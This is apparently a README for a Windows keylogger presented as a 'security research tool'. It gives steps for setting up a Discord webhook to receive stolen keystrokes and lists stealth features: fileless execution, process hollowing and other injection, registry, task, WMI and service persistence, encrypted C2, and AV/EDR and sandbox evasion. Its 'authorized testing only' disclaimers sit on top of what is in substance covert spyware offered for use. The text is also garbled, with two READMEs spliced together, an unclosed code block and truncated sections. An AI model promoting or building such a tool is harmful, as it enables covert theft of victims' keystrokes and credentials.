# ⌨️ Windows Keylogger - Security Research Tool

> **⚠️ FOR AUTHORIZED WINDOWS SECURITY TESTING ONLY**

A Windows-focused keylogger implementation for legitimate security research, penetration testing, and educational purposes.

## 🖥️ Windows Compatibility

- **Tested On**: Windows 10/11
- **Architecture**: x64/x86
- **Python**: 3.8+
- **Dependencies**: Windows-compatible only

## 🔗 Discord Webhook Integration

### Step 1: Create Discord Webhook
1. Go to your Discord server
2. Click server settings → Integrations → Webhooks
3. Create New Webhook
4. Copy the webhook URL

### Step 2: Replace Webhook in Code
```python
# In src/keylogger.py, replace this line:
WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE"

# With your actual webhook:
WEBHOOK_URL = "https://discord.com/api/webhooks/your_webhook_id/your_webhook_token"

## 🚀 Quick Start (Windows)

### Prerequisites

# Install Python 3.8+

python --version

# 🔐 Code2 Advanced Keylogger - Professional Security Research Tool

> **⚠️ AUTHORIZED SECURITY RESEARCH & PENETRATION TESTING ONLY**  
> **DEVELOPED FOR CODE2 SECURITY RESEARCH INITIATIVE**

A professional-grade keylogger implementation featuring advanced evasion techniques, multiple persistence mechanisms, and stealth operations designed for legitimate security testing and red team operations.

## 🛡️ Code2 Professional Features

### 🔷 Memory Execution & Stealth Operations
- **Reflective PE Loading**: Executes in memory without file artifacts
- **Process Hollowing**: Injects into legitimate Windows processes
- **Fileless Deployment**: RAM-only execution capabilities
- **Dynamic Import Resolution**: Avoids static API imports

### 🔷 Advanced Persistence Mechanisms
- **Startup Folder Integration**: `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`
- **Registry Run Keys**: 
  - `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
  - `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
- **Scheduled Tasks**: XML-based task creation for logon triggers
- **WMI Event Subscription**: Permanent persistence via WMI filters
- **Windows Service Installation**: Runs as background system service

### 🔷 Encrypted Communication & C2
- **AES-256 Encryption**: Military-grade data encryption
- **Custom Protocol**: Proprietary C2 communication channel
- **Certificate Pinning**: Secure webhook verification
- **Data Obfuscation**: Multiple encoding layers (Base64, Hex, Custom)
- **Traffic Blending**: Mimics legitimate HTTPS traffic

### 🔷 AV/EDR Evasion Techniques
- **Signature Avoidance**: Custom packer and crypter
- **Behavioral Evasion**: Delayed execution and environment checks
- **Sandbox Detection**: VM, sandbox, and analysis environment identification
- **API Hooking Detection**: Identifies security product hooks
- **Process Spoofing**: Masquerades as legitimate Windows processes

### 🔷 Process Injection & Hiding
- **DLL Injection**: Injects into trusted processes
- **Process Doppelgänging**: Uses NTFS transactions for stealth
- **Atom Bombing**: Advanced code injection technique
- **Module Stomping**: Replaces legitimate DLLs in memory
- **PPID Spoofing**: Masquerades parent process relationships

## 🚀 Code2 Technical Specifications

### Architecture

# Install dependencies
pip install -r requirements.txt
